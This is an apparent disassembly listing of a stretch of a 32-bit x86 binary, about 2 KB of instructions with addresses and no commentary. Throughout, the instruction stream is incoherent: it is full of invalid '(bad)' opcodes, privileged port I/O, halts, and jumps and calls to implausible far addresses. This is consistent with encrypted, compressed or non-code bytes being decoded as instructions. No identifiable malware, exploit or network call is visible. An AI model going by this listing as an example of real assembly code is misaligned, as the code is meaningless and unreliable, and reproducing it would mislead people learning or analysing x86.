  406844:	mov    dh,0x32
  406846:	sbb    BYTE PTR [ecx+0x600656f9],cl
  40684c:	lds    edi,FWORD PTR [ecx-0x75d8bec0]
  406852:	nop
  406853:	push   ebp
  406854:	imul   ecx,DWORD PTR [edx+0x3b],0xe17a7cad
  40685b:	fmul   QWORD PTR [ecx+0x11]
  40685e:	adc    cl,bh
  406860:	mov    edx,0x400dc577
  406865:	mov    ecx,0x9ea53cc9
  40686a:	out    0xeb,eax
  40686c:	or     DWORD PTR [ebx-0x583f0170],edx
  406872:	in     al,dx
  406873:	mov    dl,0x50
  406875:	stos   DWORD PTR es:[edi],eax
  406876:	fnstenv [edx+0x44]
  406879:	mov    esi,0x2de2326c
  40687e:	cmp    al,0x80
  406880:	mov    al,0xfc
  406882:	hlt    
  406883:	push   ebx
  406884:	sbb    eax,0x9be37f6f
  406889:	xchg   BYTE PTR [edx+0x21],ah
  40688c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40688d:	fdivr  st,st(4)
  40688f:	pop    edx
  406890:	ins    DWORD PTR es:[edi],dx
  406891:	mov    ebp,0x10879e99
  406896:	retw   0xa3fe
  40689a:	cmp    eax,0xe15289f9
  40689f:	mov    ecx,0x6648e17f
  4068a4:	sub    BYTE PTR [esp+eax*8+0x2c24a46a],ah
  4068ab:	xchg   ecx,eax
  4068ac:	dec    esp
  4068ad:	scas   al,BYTE PTR es:[edi]
  4068ae:	xor    ch,ah
  4068b0:	xchg   ebx,eax
  4068b1:	mov    edi,0x6cf70c1a
  4068b6:	and    al,0x3c
  4068b8:	mov    ebp,0xdfd0c443
  4068bd:	rol    DWORD PTR [edx-0x7a],1
  4068c0:	adc    eax,0x389798e7
  4068c5:	jmp    0x4068a6
  4068c7:	push   0xffffffe2
  4068c9:	enter  0x68ec,0x75
  4068cd:	fisttp DWORD PTR [edi-0x31]
  4068d0:	inc    DWORD PTR [ecx]
  4068d2:	lea    esi,[ebp-0x3e]
  4068d5:	inc    ebp
  4068d6:	push   edx
  4068d7:	sub    esi,0x14191bc3
  4068dd:	xor    BYTE PTR [eax-0x7b0f67fa],dl
  4068e3:	icebp  
  4068e4:	adc    bh,BYTE PTR [ecx+0x4cac1b4]
  4068ea:	(bad)  
  4068eb:	fstp   QWORD PTR [edi-0x43]
  4068ee:	jg     0x4068f2
  4068f0:	cli    
  4068f1:	rol    BYTE PTR [ebp+ebp*1-0x17137ded],1
  4068f8:	and    al,0xb6
  4068fa:	out    0x91,eax
  4068fc:	nop
  4068fd:	ins    BYTE PTR es:[edi],dx
  4068fe:	push   ebp
  4068ff:	mov    ds:0xddc2a5e8,eax
  406904:	cmp    DWORD PTR [eax+0x898926f],edx
  40690a:	mov    eax,ds:0x946ce5d8
  40690f:	pop    es
  406910:	cdq    
  406911:	push   ds
  406912:	mov    dl,0xa6
  406914:	scas   al,BYTE PTR es:[edi]
  406915:	push   0x63
  406917:	xor    eax,0x645623a1
  40691c:	cli    
  40691d:	cdq    
  40691e:	(bad)  
  40691f:	dec    ebp
  406920:	fmul   st(1),st
  406922:	inc    ecx
  406923:	push   ds
  406924:	mov    ebx,0x6f2faecf
  406929:	out    0xbb,eax
  40692b:	add    edx,DWORD PTR [ecx+esi*2+0x21]
  40692f:	sub    ebp,DWORD PTR [esp+ecx*1-0x22]
  406933:	mov    bh,0x24
  406935:	shl    BYTE PTR [eax+0xb815b28],0x3d
  40693c:	xor    BYTE PTR [edx-0x1883af4f],dh
  406942:	pop    ss
  406943:	dec    ebx
  406944:	test   eax,0x1533352a
  406949:	test   eax,0xcca9d92f
  40694e:	leave  
  40694f:	pop    eax
  406950:	repz jle 0x406975
  406953:	fisttp QWORD PTR [esi]
  406955:	scas   al,BYTE PTR es:[edi]
  406956:	xchg   al,ch
  406958:	loop   0x40692f
  40695a:	push   es
  40695b:	mov    ebx,0x6048117d
  406960:	lahf   
  406961:	mov    edi,ecx
  406963:	xchg   ebx,eax
  406964:	sbb    eax,0xc73224b
  406969:	repnz add al,0xd2
  40696c:	pop    esi
  40696d:	nop
  40696e:	adc    BYTE PTR [ebx-0x57],bl
  406971:	mov    ecx,0x89616109
  406976:	test   BYTE PTR [edx+0x36e507c3],bl
  40697c:	sahf   
  40697d:	daa    
  40697e:	mov    BYTE PTR [ecx+0x7c],al
  406981:	push   edx
  406982:	xchg   esp,eax
  406983:	loope  0x406919
  406985:	addr16 adc edi,edx
  406988:	dec    ebx
  406989:	out    dx,eax
  40698a:	jno    0x406987
  40698c:	loopne 0x4069e4
  40698e:	loop   0x40697b
  406990:	cmp    BYTE PTR cs:[esi-0x10c5338c],dl
  406997:	mov    bh,0x1b
  406999:	lods   eax,DWORD PTR ds:[esi]
  40699a:	mov    ebx,0x7c9a9a0b
  40699f:	(bad)  
  4069a0:	in     al,dx
  4069a1:	test   bl,bh
  4069a3:	sub    eax,0xf7a7042c
  4069a8:	xor    BYTE PTR [ecx-0x9a72fe1],cl
  4069ae:	bnd jge 0x406a24
  4069b1:	mov    ah,cl
  4069b3:	and    DWORD PTR [ebx-0x27],ecx
  4069b6:	sub    BYTE PTR [eax],bl
  4069b8:	or     DWORD PTR ds:0xbd10fa2d,0xdfba08eb
  4069c2:	les    esi,FWORD PTR [edi]
  4069c4:	loop   0x4069e7
  4069c6:	push   esi
  4069c7:	popf   
  4069c8:	je     0x40695c
  4069ca:	sbb    al,0xd9
  4069cc:	pop    ds
  4069cd:	xor    eax,0xbf58fe5c
  4069d2:	sub    eax,0xed111721
  4069d7:	rcl    DWORD PTR [ecx],1
  4069d9:	cmp    bh,BYTE PTR ds:[esp+edx*8+0x39]
  4069de:	mov    bl,0xba
  4069e0:	lahf   
  4069e1:	pop    ds
  4069e2:	and    esi,DWORD PTR [eax+0x13]
  4069e5:	int    0x7f
  4069e7:	pusha  
  4069e8:	pop    ds
  4069e9:	lds    esi,FWORD PTR [esi]
  4069eb:	and    BYTE PTR [edi+0x40],cl
  4069ee:	std    
  4069ef:	sbb    eax,0xb8038ae4
  4069f4:	sbb    esi,DWORD PTR [eax+0x1c]
  4069f7:	stos   BYTE PTR es:[edi],al
  4069f8:	fild   WORD PTR ds:0x246dc546
  4069fe:	mov    gs,edi
  406a00:	pop    ebp
  406a01:	inc    ecx
  406a02:	ficomp DWORD PTR [edx-0x3c]
  406a05:	jmp    0x714e:0x10b4d880
  406a0c:	xor    ebp,DWORD PTR [edx-0x6c45540b]
  406a12:	mov    bh,0x71
  406a14:	and    DWORD PTR ds:0x6f3193b5,eax
  406a1a:	push   ebx
  406a1b:	mov    bl,0xeb
  406a1d:	mov    dh,0xcf
  406a1f:	add    dl,BYTE PTR [edi-0x1c]
  406a22:	fldenv [ebp-0x22]
  406a25:	pushf  
  406a26:	pushf  
  406a27:	into   
  406a28:	ss rcl ebx,1
  406a2b:	aad    0x71
  406a2d:	xlat   BYTE PTR ds:[ebx]
  406a2e:	jmp    0x9ce4f023
  406a33:	xor    eax,0xa499aa6e
  406a38:	call   esp
  406a3a:	jb     0x406a56
  406a3c:	jnp    0x406a3b
  406a3e:	(bad)  
  406a3f:	mov    esp,0x14e80192
  406a44:	mov    al,ds:0x3a7d58bc
  406a49:	cmp    eax,0xd588a702
  406a4e:	adc    eax,0x867c67ae
  406a53:	js     0x406a9c
  406a55:	fist   DWORD PTR [esi-0x50]
  406a58:	aas    
  406a59:	sbb    eax,0x85489d66
  406a5e:	mov    cl,0x61
  406a60:	mov    esi,0x225bb2c7
  406a65:	mov    dh,BYTE PTR [edx]
  406a67:	stos   BYTE PTR es:[edi],al
  406a68:	push   cs
  406a69:	mov    dh,0x53
  406a6b:	mov    bh,ch
  406a6d:	cmp    eax,0xecbbd908
  406a72:	call   0x72b5972
  406a77:	push   ds
  406a78:	test   al,0xf9
  406a7a:	mov    DWORD PTR [esi+0x47a073e0],esi
  406a80:	adc    dh,bh
  406a82:	jmp    0xd99c046b
  406a87:	mov    cl,dl
  406a89:	push   eax
  406a8a:	adc    edx,edi
  406a8c:	pop    ds
  406a8d:	dec    ebp
  406a8e:	inc    ecx
  406a8f:	test   al,0x0
  406a91:	aam    0x3f
  406a93:	bnd jae 0x406a85
  406a96:	sub    eax,0x72918390
  406a9b:	adc    ebp,esp
  406a9d:	jne    0x406a4a
  406a9f:	dec    ebp
  406aa0:	and    ebx,DWORD PTR [ecx-0x71]
  406aa3:	mov    ds:0x6640b9bb,eax
  406aa8:	jne    0x406adf
  406aaa:	hlt    
  406aab:	jmp    0x406af2
  406aad:	test   al,0x65
  406aaf:	scas   al,BYTE PTR es:[edi]
  406ab0:	xor    DWORD PTR [ebx+0x56],esi
  406ab3:	and    edi,esp
  406ab5:	repnz pop edi
  406ab7:	data16 outs dx,BYTE PTR ds:[esi]
  406ab9:	out    dx,al
  406aba:	cmp    ecx,DWORD PTR [ecx]
  406abc:	iret   
  406abd:	pop    eax
  406abe:	fbstp  TBYTE PTR [edx+0x2f21f1d2]
  406ac4:	mov    edx,0xda4be8b0
  406ac9:	outs   dx,DWORD PTR ds:[esi]
  406aca:	mov    ch,0xdb
  406acc:	out    dx,eax
  406acd:	mov    DWORD PTR [ecx-0x2a0f5605],esp
  406ad3:	xchg   ebx,eax
  406ad4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ad5:	mov    bl,0x2
  406ad7:	inc    esp
  406ad8:	test   DWORD PTR [eax+0x1e729951],ebx
  406ade:	xor    al,0x85
  406ae0:	xchg   edi,eax
  406ae1:	sbb    DWORD PTR [ebx-0x1e],eax
  406ae4:	js     0x406b25
  406ae6:	dec    eax
  406ae7:	mov    dh,0xca
  406ae9:	mov    cs,esp
  406aeb:	mov    ds:0x6d03771c,eax
  406af0:	(bad)  
  406af1:	push   esp
  406af2:	pop    ecx
  406af3:	das    
  406af4:	js     0x406a78
  406af6:	and    ecx,esi
  406af8:	adc    BYTE PTR [edi*1+0x4226a103],0xaf
  406b00:	aaa    
  406b01:	ret    
  406b02:	ror    BYTE PTR [esi+ebp*1-0x69ce00ec],cl
  406b09:	rol    BYTE PTR [edi+0x67],1
  406b0c:	inc    esi
  406b0d:	(bad)  
  406b0e:	retf   0xe4e
  406b11:	scas   eax,DWORD PTR es:[edi]
  406b12:	aam    0x7d
  406b14:	test   al,0xe0
  406b16:	mov    edi,0xf81bf294
  406b1b:	jbe    0x406b69
  406b1d:	retf   
  406b1e:	out    dx,eax
  406b1f:	adc    DWORD PTR [esi-0x15],esp
  406b22:	mov    esp,0xef30cbc8
  406b27:	xor    dl,BYTE PTR [ebx+0x24]
  406b2a:	mov    esi,0xdcf5b863
  406b2f:	pop    ebx
  406b30:	jmp    0xb6d7:0x2e8d2d69
  406b37:	mov    ch,0xa3
  406b39:	xchg   edi,eax
  406b3a:	add    bh,BYTE PTR [edx]
  406b3c:	mov    al,0xe8
  406b3e:	repz dec ebx
  406b40:	sub    cl,al
  406b42:	and    ecx,0x62a14ddd
  406b48:	pop    ss
  406b49:	cdq    
  406b4a:	cld    
  406b4b:	out    dx,eax
  406b4c:	sar    BYTE PTR [edx],1
  406b4e:	out    0xa2,eax
  406b50:	stos   BYTE PTR es:[edi],al
  406b51:	sub    edi,ecx
  406b53:	fsub   QWORD PTR [esi+0x3e]
  406b56:	mov    BYTE PTR [ebp+0xe],dl
  406b59:	clc    
  406b5a:	les    ebp,FWORD PTR [ebx-0x55f4115a]
  406b60:	pop    esp
  406b61:	push   cs
  406b62:	jbe    0x406b67
  406b64:	mov    esp,0x3cbf25a2
  406b69:	xchg   esp,eax
  406b6a:	mov    ah,0x91
  406b6c:	mov    al,0x31
  406b6e:	mov    BYTE PTR [eax],dl
  406b70:	cmp    ebp,esi
  406b72:	aaa    
  406b73:	mov    ds,edi
  406b75:	adc    eax,0x58083e35
  406b7a:	fistp  QWORD PTR [ebp-0x53]
  406b7d:	daa    
  406b7e:	(bad)  
  406b7f:	clc    
  406b80:	shr    BYTE PTR [eax],1
  406b82:	add    DWORD PTR [edx],edx
  406b84:	dec    esi
  406b85:	mov    al,ds:0x12d5ed7e
  406b8a:	mov    DWORD PTR [ebp+ebp*2+0x314f603f],ebx
  406b91:	jno    0x406bf8
  406b93:	lods   eax,DWORD PTR ds:[esi]
  406b94:	inc    ebx
  406b95:	cmp    eax,0xc1ec1b50
  406b9a:	int    0xa8
  406b9c:	loopne 0x406b53
  406b9e:	stos   BYTE PTR es:[edi],al
  406b9f:	pop    ebx
  406ba0:	dec    esi
  406ba1:	int    0x96
  406ba3:	int3   
  406ba4:	mov    ecx,0x94ae0ae9
  406ba9:	push   ecx
  406baa:	cli    
  406bab:	(bad)  
  406bac:	(bad)  
  406bae:	mov    al,0xb2
  406bb0:	jae    0x406c01
  406bb2:	inc    edi
  406bb3:	cmp    BYTE PTR [ebx+0x52],cl
  406bb6:	jno    0x406bfc
  406bb8:	push   edi
  406bb9:	(bad)  
  406bba:	fnstcw WORD PTR [ecx]
  406bbc:	adc    BYTE PTR [edx-0x5d],dl
  406bbf:	clc    
  406bc0:	mov    ecx,0x162ba368
  406bc5:	mov    ?,WORD PTR [ebx]
  406bc7:	sbb    eax,0x29a4ac34
  406bcc:	cmp    al,0xf7
  406bce:	xchg   ecx,eax
  406bcf:	ins    DWORD PTR es:[edi],dx
  406bd0:	sub    bl,BYTE PTR [esi+esi*4]
  406bd3:	jle    0x406c47
  406bd5:	add    DWORD PTR [ecx],ebx
  406bd7:	and    dh,BYTE PTR [eax*2+0x50aac4d5]
  406bde:	(bad)  
  406bdf:	fwait
  406be0:	aam    0xe1
  406be2:	pop    es
  406be3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406be4:	and    DWORD PTR [esi],ebx
  406be6:	mov    WORD PTR [eax],gs
  406be8:	push   eax
  406be9:	outs   dx,BYTE PTR ds:[esi]
  406bea:	ss xchg edx,eax
  406bec:	dec    esp
  406bed:	stos   BYTE PTR es:[edi],al
  406bee:	xor    eax,0x18c6fbae
  406bf3:	das    
  406bf4:	jno    0x406b80
  406bf6:	xchg   ebx,eax
  406bf7:	jnp    0x406c04
  406bf9:	fsubr  QWORD PTR [esp+edx*8+0x3a]
  406bfd:	rcr    DWORD PTR [esi+0x5568920],0x36
  406c04:	sahf   
  406c05:	or     BYTE PTR [esi+ebp*8+0x746a156f],bh
  406c0c:	sbb    al,0x67
  406c0e:	ss fwait
  406c10:	xchg   esi,eax
  406c11:	add    al,bh
  406c13:	push   es
  406c14:	fsub   DWORD PTR ss:[ebp-0x7a3e88b1]
  406c1b:	sbb    BYTE PTR [edi+0x54],0xc7
  406c1f:	add    eax,0x32971c6d
  406c24:	mov    ds:0x38ee065f,eax
  406c29:	nop
  406c2a:	add    BYTE PTR [ebp-0x41ba9a6e],bl
  406c30:	fsubr  QWORD PTR [esi]
  406c32:	jns    0x406bff
  406c34:	(bad)  [esi]
  406c36:	push   esp
  406c37:	test   eax,0x6dabaaef
  406c3c:	test   eax,0x208ed53a
  406c42:	sbb    BYTE PTR [eax+0x2],bh
  406c45:	hlt    
  406c46:	and    eax,DWORD PTR [edx*4-0x4d8dd3e3]
  406c4d:	push   ebp
  406c4e:	and    dh,ah
  406c50:	fiadd  DWORD PTR [ecx+0x24]
  406c53:	pop    eax
  406c54:	sbb    ecx,esi
  406c56:	pop    es
  406c57:	not    BYTE PTR [ecx-0x35]
  406c5a:	sar    DWORD PTR [ebx],1
  406c5c:	imul   edi,DWORD PTR [eax+eiz*2-0x39]
  406c61:	cmp    BYTE PTR [ebx+0x5],ah
  406c64:	aaa    
  406c65:	dec    ebx
  406c66:	rol    ah,cl
  406c68:	push   edi
  406c69:	pop    edx
  406c6a:	or     BYTE PTR [ecx+eiz*4],0x92
  406c6e:	call   0x1eb8e185
  406c73:	out    dx,eax
  406c74:	push   ecx
  406c75:	adc    dh,BYTE PTR [ebp-0x5f6b1c96]
  406c7b:	pop    eax
  406c7c:	mov    ch,0x93
  406c7e:	mov    ds:0x40a9a2b5,eax
  406c83:	dec    esp
  406c84:	nop
  406c85:	mov    ah,0x9f
  406c87:	rcr    BYTE PTR [esp+eax*8-0x32b3a98a],cl
  406c8e:	cmp    DWORD PTR [ecx+0x5c42344],edx
  406c94:	mov    ch,0xa5
  406c96:	int3   
  406c97:	pusha  
  406c98:	adc    DWORD PTR [edi-0x6c],ebp
  406c9b:	loopne 0x406c3a
  406c9d:	ins    BYTE PTR es:[edi],dx
  406c9e:	sub    eax,0x8d2f09a8
  406ca3:	pusha  
  406ca4:	lock jbe 0x406c8d
  406ca7:	jno    0x406d18
  406ca9:	mov    dh,0x95
  406cab:	call   0x1cf41f71
  406cb0:	xor    al,0x62
  406cb2:	call   0xf8f6dc88
  406cb7:	mov    dl,0xa7
  406cb9:	cmp    al,0xa3
  406cbb:	ds add eax,0x2685d06c
  406cc1:	stc    
  406cc2:	ret    
  406cc3:	mov    ds:0x367fb098,eax
  406cc8:	test   BYTE PTR [edx],al
  406cca:	dec    edx
  406ccb:	mov    ds:0x73eeefe3,eax
  406cd0:	pop    ebx
  406cd1:	out    dx,eax
  406cd2:	jae    0x406c5d
  406cd4:	les    ebx,FWORD PTR [eax+0x4aac2438]
  406cda:	aas    
  406cdb:	fdivr  DWORD PTR [ebx+edi*1]
  406cde:	clc    
  406cdf:	lahf   
  406ce0:	(bad)  
  406ce1:	mov    dl,0x56
  406ce3:	call   0x9363cb5a
  406ce8:	mov    DWORD PTR [ebx-0x78364327],edi
  406cee:	out    dx,al
  406cef:	(bad)  
  406cf0:	aaa    
  406cf1:	mov    BYTE PTR [esi],ch
  406cf3:	and    al,0xcf
  406cf5:	push   es
  406cf6:	nop
  406cf7:	std    
  406cf8:	ins    DWORD PTR es:[edi],dx
  406cf9:	dec    esp
  406cfa:	and    ebp,DWORD PTR [esi]
  406cfc:	leave  
  406cfd:	in     al,dx
  406cfe:	or     DWORD PTR [ecx+0x58bcc459],0x6eec8cf3
  406d08:	pop    edi
  406d09:	dec    BYTE PTR [ecx-0x10ca9c15]
  406d0f:	xchg   ecx,eax
  406d10:	sahf   
  406d11:	xchg   ebp,eax
  406d12:	sub    eax,DWORD PTR [edi+edx*1+0x5e7a674b]
  406d19:	mov    dl,0x6f
  406d1b:	jmp    0x406d4d
  406d1d:	aam    0x58
  406d1f:	out    0x63,eax
  406d21:	and    BYTE PTR [esi+ebx*4-0x23],bl
  406d25:	outs   dx,DWORD PTR ds:[esi]
  406d26:	jae    0x406d5d
  406d28:	cmp    al,0xfc
  406d2a:	rol    DWORD PTR [ebp-0x3247ece1],0x98
  406d31:	js     0x406cff
  406d33:	push   esi
  406d34:	lods   eax,DWORD PTR ds:[esi]
  406d35:	xor    DWORD PTR [ebx-0x4f8704ca],0x9090913c
  406d3f:	sub    DWORD PTR [esi-0x40],ebp
  406d42:	push   es
  406d43:	push   edi
  406d44:	or     ch,BYTE PTR [edx]
  406d46:	jmp    0xb3a:0xfa993c09
  406d4d:	sbb    BYTE PTR [edi+0x48],ch
  406d50:	mov    esi,0xb2a63377
  406d55:	inc    edx
  406d56:	bound  edx,QWORD PTR [eax]
  406d58:	jl     0x406d2f
  406d5a:	dec    esp
  406d5b:	in     eax,dx
  406d5c:	sbb    ebp,esp
  406d5e:	mov    cs,WORD PTR [edx+0x7a]
  406d61:	cdq    
  406d62:	dec    eax
  406d63:	jne    0x406d34
  406d65:	outs   dx,BYTE PTR ds:[esi]
  406d66:	mov    ch,0xee
  406d68:	leave  
  406d69:	push   ecx
  406d6a:	nop
  406d6b:	xor    ch,BYTE PTR [ecx-0x47169207]
  406d71:	jo     0x406d01
  406d73:	data16 jbe 0x406d00
  406d76:	pop    eax
  406d77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d78:	test   eax,0xc72e5556
  406d7d:	scas   al,BYTE PTR es:[edi]
  406d7e:	and    al,0xe3
  406d80:	jno    0x406d19
  406d82:	push   0xffffffd5
  406d84:	add    al,0x1
  406d86:	repz les eax,FWORD PTR [edx+0x57b38251]
  406d8d:	jg     0x406d69
  406d8f:	addr16 or al,0xe2
  406d92:	mov    BYTE PTR [ebp-0x5b2a0f35],bl
  406d98:	into   
  406d99:	icebp  
  406d9a:	dec    ebx
  406d9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d9c:	test   BYTE PTR [esi+0x19],dh
  406d9f:	rcr    BYTE PTR [eax+0x31],cl
  406da2:	mov    ebp,0x558fe24a
  406da7:	mov    eax,0x69af4b1e
  406dac:	hlt    
  406dad:	and    eax,0xc3e1bcb
  406db2:	inc    esp
  406db3:	ret    
  406db4:	sub    eax,0x4f3620cb
  406db9:	jns    0x406d55
  406dbb:	pop    ss
  406dbc:	sti    
  406dbd:	ja     0x406d86
  406dbf:	sub    DWORD PTR [ebx+esi*4],esi
  406dc2:	int3   
  406dc3:	test   eax,0x4ba323ea
  406dc8:	dec    ebx
  406dc9:	jmp    0x599ad00e
  406dce:	mov    ecx,0xd4668745
  406dd4:	inc    eax
  406dd5:	xor    BYTE PTR [esi+0x53],bl
  406dd8:	cmp    ebx,DWORD PTR [ebx+0x58343660]
  406dde:	push   esp
  406ddf:	popf   
  406de0:	rol    BYTE PTR [ecx],1
  406de2:	mov    al,ds:0xe8610e17
  406de7:	and    ch,BYTE PTR [edi-0x70977d98]
  406ded:	out    dx,al
  406dee:	ret    
  406def:	les    esp,FWORD PTR [ebp+0x40]
  406df2:	loopne 0x406d75
  406df4:	mov    ecx,0x340863af
  406df9:	lods   eax,DWORD PTR ds:[esi]
  406dfa:	mov    ebp,0xdcfddd00
  406dff:	imul   ebx,ecx,0x10
  406e02:	test   DWORD PTR [ebx],edi
  406e04:	adc    ch,BYTE PTR [edx]
  406e06:	inc    ecx
  406e07:	jae    0x406df1
  406e09:	cli    
  406e0a:	jmp    0x9eec:0x1f69d1f1
  406e11:	cmp    edi,DWORD PTR [edx-0x73]
  406e14:	aad    0x68
  406e16:	xchg   edx,eax
  406e17:	mov    ds:0x278b9207,eax
  406e1c:	outs   dx,DWORD PTR ds:[esi]
  406e1d:	xor    bl,BYTE PTR [edx+0x67]
  406e20:	out    0xdc,al
  406e22:	addr16 clc 
  406e24:	(bad)
  406e27:	xchg   ecx,eax
  406e28:	hlt    
  406e29:	pop    ebp
  406e2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e2b:	int3   
  406e2c:	das    
  406e2d:	sub    eax,0x59f9c7f6
  406e32:	inc    ecx
  406e33:	cmc    
  406e34:	stos   BYTE PTR es:[edi],al
  406e35:	add    BYTE PTR [eax+0x4760cd57],ah
  406e3b:	pop    es
  406e3c:	es xor eax,0xc260ae1e
  406e42:	adc    ch,dh
  406e44:	add    DWORD PTR [eax-0xbd632a8],ecx
  406e4a:	jg     0x406df1
  406e4c:	or     DWORD PTR [ecx+0x5867e652],esp
  406e52:	and    BYTE PTR [edx],ch
  406e54:	retf   
  406e55:	and    al,0xf4
  406e57:	push   esp
  406e58:	ret    0xcc1b
  406e5b:	mov    dl,0x20
  406e5d:	shr    BYTE PTR [edi+0x748943ad],1
  406e63:	fwait
  406e64:	les    ebp,FWORD PTR ds:0x64860364
  406e6a:	out    0xa3,eax
  406e6c:	pop    ecx
  406e6d:	call   0xc64f:0xd8bf502e
  406e74:	jcxz   0x406e92
  406e77:	call   0x5c345256
  406e7c:	pusha  
  406e7d:	add    bh,BYTE PTR [ebx+0xfdebe15]
  406e83:	mov    ds:0xa1c43222,al
  406e88:	cmp    al,0xaa
  406e8a:	pop    ecx
  406e8b:	push   edx
  406e8c:	mov    dh,0x5c
  406e8e:	mov    ecx,0x7a9ff42c
  406e93:	mov    bh,0x1f
  406e95:	jne    0x406eca
  406e97:	and    dh,BYTE PTR [edi+0x44270baa]
  406e9d:	lock xlat BYTE PTR ds:[ebx]
  406e9f:	arpl   WORD PTR [esi+0x69],si
  406ea2:	mov    edx,esp
  406ea4:	mov    eax,ds:0x74dfe1e5
  406ea9:	jmp    0x9fa3a21f
  406eae:	mov    edx,0xa68082b4
  406eb3:	jge    0x406ea5
  406eb5:	mov    ?,WORD PTR es:[esi+0x7e1d36f0]
  406ebc:	test   eax,0x62ac17dd
  406ec1:	cs mov edi,0x9efc2d36
  406ec7:	lahf   
  406ec8:	lahf   
  406ec9:	mov    eax,ds:0xecbe551b
  406ece:	inc    esp
  406ecf:	fwait
  406ed0:	cmp    DWORD PTR [ebx-0xd2efeb6],eax
  406ed6:	add    eax,0x836faf5d
  406edb:	repnz mov esi,0xae83bc74
  406ee1:	cs ins DWORD PTR es:[edi],dx
  406ee3:	aas    
  406ee4:	test   al,0xac
  406ee6:	inc    ebp
  406ee7:	push   esi
  406ee8:	mov    ?,WORD PTR [edi]
  406eea:	adc    ecx,DWORD PTR [ecx]
  406eec:	stc    
  406eed:	and    esi,esi
  406eef:	not    BYTE PTR [edi+0x69abdfbe]
  406ef5:	retf   0x35b3
  406ef8:	lods   al,BYTE PTR ds:[esi]
  406ef9:	jmp    0x956e:0xe825ae99
  406f00:	xchg   ebx,eax
  406f01:	jb     0x406f5a
  406f03:	ds aam 0x88
  406f06:	mov    ch,0xfc
  406f08:	mov    eax,0x14249812
  406f0d:	cmp    DWORD PTR [ebx],eax
  406f0f:	out    0x6d,eax
  406f11:	rcl    ebx,0xb4
  406f14:	xchg   esi,eax
  406f15:	push   0x6e6898a1
  406f1a:	mov    al,BYTE PTR [edi+esi*2]
  406f1d:	sbb    esi,DWORD PTR [ebx+0x46]
  406f20:	repnz cmc 
  406f22:	push   edi
  406f23:	sti    
  406f24:	into   
  406f25:	data16 aas 
  406f27:	add    bh,BYTE PTR [esi]
  406f29:	and    al,0x1b
  406f2b:	in     al,0x28
  406f2d:	sub    esp,DWORD PTR [esi+ecx*2+0x73]
  406f31:	push   0xa1c41a9f
  406f36:	cwde   
  406f37:	aas    
  406f38:	and    BYTE PTR [ecx-0x776b6331],cl
  406f3e:	pop    esi
  406f3f:	popf   
  406f40:	xchg   BYTE PTR [ecx-0x59242087],dl
  406f46:	sbb    bh,BYTE PTR [bp-0x19]
  406f4a:	sbb    eax,0x216fbe8b
  406f4f:	pop    esi
  406f50:	adc    BYTE PTR [eax+0x4b],0x78
  406f54:	cli    
  406f55:	jno    0x406f10
  406f57:	xlat   BYTE PTR ds:[ebx]
  406f58:	aaa    
  406f59:	xchg   ebx,eax
  406f5a:	fsub   QWORD PTR [ecx]
  406f5c:	jle    0x406fd1
  406f5e:	pusha  
  406f5f:	push   esi
  406f60:	mov    cs,WORD PTR ds:0xdbe19eee
  406f66:	pushf  
  406f67:	dec    edx
  406f68:	pop    edi
  406f69:	arpl   WORD PTR [ebp-0x4],cx
  406f6c:	imul   ebx,DWORD PTR [ebp-0x302ae5b4],0x9ec4f8a6
  406f76:	cmp    ah,BYTE PTR [edx-0x42e5535a]
  406f7c:	cdq    
  406f7d:	dec    ebp
  406f7e:	pop    ebx
  406f7f:	sbb    DWORD PTR ds:0xb2dce9b9,0x6a
  406f86:	jge    0x406fb2
  406f88:	adc    eax,0xc66e3a78
  406f8d:	pop    edi
  406f8e:	push   eax
  406f8f:	push   ss
  406f90:	nop
  406f91:	ins    DWORD PTR es:[edi],dx
  406f92:	pop    ss
  406f93:	cmp    eax,0x99ca407f
  406f98:	stc    
  406f99:	daa    
  406f9a:	inc    edx
  406f9b:	aas    
  406f9c:	ret    
  406f9d:	in     al,0xdc
  406f9f:	mov    ecx,0x20c4e4f1
  406fa4:	js     0x406f89
  406fa6:	rcl    BYTE PTR [eax],1
  406fa8:	lds    edi,FWORD PTR ss:[esp+eax*4-0x635bd023]
  406fb0:	lds    ebx,FWORD PTR [edx]
  406fb2:	pop    ebp
  406fb3:	adc    eax,0x6b6bfaa
  406fb8:	xchg   esi,eax
  406fb9:	out    dx,al
  406fba:	fwait
  406fbb:	push   ecx
  406fbc:	mov    al,ds:0x1610cd6b
  406fc1:	add    DWORD PTR [ecx],ebx
  406fc3:	ja     0x40700e
  406fc5:	rol    DWORD PTR [edx-0x3c],0x83
  406fc9:	push   eax
  406fca:	push   ss
  406fcb:	cwde   
  406fcc:	enter  0x6b8d,0x59
  406fd0:	jmp    0x833f:0x9ed013a0
  406fd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fd8:	adc    cl,al
  406fda:	adc    eax,0x81e6c66c
  406fdf:	xchg   ebp,eax
  406fe0:	cmp    dl,cl
  406fe2:	(bad)  
  406fe4:	xchg   ebp,eax
  406fe5:	retf   0x21a3
  406fe8:	(bad)  
  406fe9:	mov    ds:0x8590231d,al
  406fee:	jge    0x407036
  406ff0:	jmp    0x406fec
  406ff2:	ud2    
  406ff4:	jb     0x40706e
  406ff6:	ins    DWORD PTR es:[edi],dx
  406ff7:	sub    BYTE PTR [ebx-0x4b],dl
  406ffa:	xchg   esp,eax
  406ffb:	jnp    0x40706b
  406ffd:	jno    0x406fd3
  406fff:	gs jmp 0x407019
  407002:	push   edx
  407003:	imul   esp,DWORD PTR [edi],0x46
  407006:	in     al,0x1f
  407008:	pop    es
  407009:	leave  
  40700a:	xchg   edx,eax
  40700b:	add    cl,BYTE PTR [ebx-0x7c]
  40700e:	blcic  ebx,DWORD PTR [eax+0x3d76edb1]
  407017:	cli    
  407018:	gs cs sti 
  40701b:	adc    bl,BYTE PTR [esi+0x0]
  40701e:	sub    ebx,DWORD PTR [esi-0x65]
  407021:	mov    ecx,0xdb5a5e04
  407026:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407027:	outs   dx,DWORD PTR ds:[esi]
  407028:	stos   BYTE PTR es:[edi],al
  407029:	jmp    0x6564f7e4
  40702e:	in     al,0xb0
  407030:	add    edi,DWORD PTR [edx+0x3fd63f8f]
  407036:	hlt    
  407037:	enter  0x848,0xde
  40703b:	mov    dl,0x1d
  40703d:	std    
